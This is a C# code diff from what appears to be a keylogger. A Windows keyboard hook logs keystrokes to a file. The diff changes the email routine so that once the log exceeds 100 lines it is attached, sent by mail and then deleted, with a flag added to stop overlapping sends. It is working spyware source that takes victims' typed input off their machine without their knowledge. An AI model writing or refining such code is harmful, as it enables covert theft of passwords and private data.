@@ -42,6 +42,7 @@ namespace Karios
         public static Bitmap memoryImage;
         public static string _keyOnline;
         private static string pathToLog;
+        public static bool EmailSending;
 
         public static void Main()
         {
@@ -265,8 +266,11 @@ namespace Karios
 
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             {
+                if (EmailSending == false)
                 {
                     Console.WriteLine("Its sending!");
+                    EmailSending = true;
+                    SendMail();
                 }
             }
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
@@ -316,7 +320,7 @@ namespace Karios
             */
         }
 
-        async Task SendMail_Aysnc()
+        public static void SendMail()
         {
             try
             {
@@ -351,10 +355,11 @@ namespace Karios
                 //clear mail attachment
                 attachment.Dispose();
                 File.Delete(pathToLog);
+                EmailSending = false;
             }
             catch
             {
-                // ignored
+                EmailSending = false;
             }
         }
 
